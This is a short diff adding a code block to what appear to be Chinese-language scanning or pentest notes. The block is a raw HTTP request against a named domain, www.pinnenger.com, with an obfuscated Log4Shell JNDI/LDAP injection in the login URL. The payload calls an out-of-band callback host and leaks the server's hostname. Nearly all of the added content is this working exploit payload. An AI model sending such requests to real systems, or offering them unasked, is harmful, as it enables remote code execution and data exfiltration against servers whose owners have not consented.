@@ -254,6 +254,15 @@ Host: pinnenger.com
 
 ```
 
+```
+GET /cas/login/?x=${jndi:ldap://${:-288}${:-166}.${hostName}.uri.d0elrs94tvh4bt7rcf0gazu3gwghwksri.oast.online/a} HTTP/1.1
+Host: www.pinnenger.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+```
+
+
 
 ## 扫描
 #### 针对常见接口的扫描 ：
